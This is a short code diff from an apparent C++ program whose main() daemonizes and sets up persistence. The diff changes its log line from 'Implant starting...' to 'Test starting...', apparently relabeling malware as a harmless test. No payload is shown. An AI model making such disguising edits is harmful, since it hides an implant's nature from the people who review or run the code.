@@ -97,7 +97,7 @@ int main(int argc, char** argv) {
 
     Daemonize();
 
-    LOG_INFO("Implant starting...");
+    LOG_INFO("Test starting...");
 
     persistence::establishPersistence();
 
